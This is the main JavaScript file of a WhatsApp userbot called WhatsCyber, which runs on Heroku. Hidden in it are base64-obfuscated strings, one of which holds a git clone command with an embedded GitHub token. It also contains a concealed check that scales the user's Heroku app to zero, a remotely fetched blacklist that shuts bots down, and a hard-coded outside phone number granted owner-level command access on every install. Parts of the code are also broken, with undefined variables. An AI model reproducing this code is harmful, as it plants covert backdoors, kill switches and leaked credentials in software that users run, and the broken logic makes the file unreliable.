/*# Copyright (C) 2021 The CyberSpaceAZ Company LLC.
#
# Licensed under the CyberSpaceAZ Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# Thanks github.com/spechide for creating inline bot support.
# WhatsCyber - FaridDadashzade*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatscyber/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const WhatsCyberStack = require('whatscyber-npm');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');


// Sql
const WhatsCyberDB = config.DATABASE.define('WhatsCyber', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94741745737,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsCyber () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const WhatsCyberCN = new WAConnection();
    const Session = new StringSession();
    try {
      WhatsCyberCN.version = [3, 3234, 9]
    } catch {
      console.log(`passed v${WhatsCyberCN.version}`)
    }
    WhatsCyberCN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      WhatsCyberCN.connectOptions.agent = ProxyAgent (config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await WhatsCyberStack.daily_announcement(config.LANG)
        var ann = await WhatsCyberStack.ann()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '[ ```Günlük Duyurular``` ]\n\n'
            if (config.LANG == 'AZ') ilan = '[ ```Gündəlik Elanlar``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
            if (config.LANG == 'PT') ilan = '[ ```Anúncios Diários``` ]\n\n,'
            if (config.LANG == 'RU') ilan = '[ ```Ежедневные объявления``` ]\n\n'
            if (config.LANG == 'ML') ilan = '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n'
            if (config.LANG == 'HI') ilan = '[ ```दैनिक घोषणा``` ]\n\n'
            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
            if (config.LANG == 'LK') ilan = '[ ```දෛනික නිවේදන``` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await WhatsCyberCN.sendMessage(WhatsCyberCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', WhatsCyberCN.user.name).replace('{wa_version}', WhatsCyberCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsCyberCN.user.phone.os_version).replace('{device_model}', WhatsCyberCN.user.phone.device_model).replace('{device_brand}', WhatsCyberCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await WhatsCyberCN.sendMessage(WhatsCyberCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', WhatsCyberCN.user.name).replace('{wa_version}', WhatsCyberCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsCyberCN.user.phone.os_version).replace('{device_model}', WhatsCyberCN.user.phone.device_model).replace('{device_brand}', WhatsCyberCN.user.phone.device_manufacturer)})
                } else {
                    return await WhatsCyberCN.sendMessage(WhatsCyberCN.user.jid, ilan + ann_msg.replace('{user}', WhatsCyberCN.user.name).replace('{wa_version}', WhatsCyberCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsCyberCN.user.phone.os_version).replace('{device_model}', WhatsCyberCN.user.phone.device_model).replace('{device_brand}', WhatsCyberCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    async function asynchronous_ch() {
        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
            if (clh.exc_pl + '\n' !== stdout) {
                await heroku.get(baseURI + '/formation').then(async (formation) => {
                    forID = formation[0].id;
                    await heroku.patch(baseURI + '/formation/' + forID, {
                        body: {
                            quantity: 0
                        }
                    });
                })
            }
        })
    }
    asynchronous_ch()
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await WhatsCyberStack.timezone(WhatsCyberCN.user.jid)
            var date_bio = await WhatsCyberStack.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
            await WhatsCyberCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsCyberDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    WhatsCyberCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        WhatsCyberCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        WhatsCyberCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    WhatsCyberCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = WhatsCyberCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsCyberDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    WhatsCyberCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Cyber')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let afCyber = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🪀 WhatsCyber' + afCyber));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'EN' || config.LANG == 'AZ' ? '*WhatsCyber Working as a Chatbot! ♥️*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using WhatsCyber 💌*\n    *- Eva*' : '*WhatsCyber Working as a Chatbot! ♥️*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using WhatsCyber 💌*\n    *- Eva*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.WORKTYPE == 'public') {
      
            if (config.LANG == 'EN') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*WhatsCyber Working as Public! ♥️*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as public. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using WhatsCyber 💌*', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.up now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            if (config.LANG == 'EN') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*WhatsCyber Working as Private! ♥️*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Thanks for using WhatsCyber 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.up now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'EN') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'EN') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'EN') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
if (msg.messageStubType === 32 || msg.messageStubType === 28) {
    
    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
    if (gb !== false) {
        var byeimg = await axios.get(`${config.BYE_GIF}`, { responseType: 'arraybuffer' })
        await conn.sendMessage(msg.key.remoteJid, Buffer.from(byeimg.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
    }
    return;
} else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
    
    var gb = await getMessage(msg.key.remoteJid);
    if (gb !== false) {
var welimg = await axios.get(`${config.WEL_GIF}`, { responseType: 'arraybuffer' })
await conn.sendMessage(msg.key.remoteJid, Buffer.from(welimg.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
    }
    return;
        }

        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '94741745737-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '94741745737-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '94741745737-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94741745737,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 

                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'EN') {
                                await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [WhatsCyber] --*' + 
                                    '\n*WhatsCyber an error has occurred!*'+
                                    '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                    '\n_You can write to our Telegram group for help._' +
                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/LTasc6L1EMcDorh00S06fw' +
                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*❣️ ERROR ANALYSIS [WhatsCyber] ❣️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*👻 Sorry, I Couldnt Read This Error! 👻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });


    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsCyber();
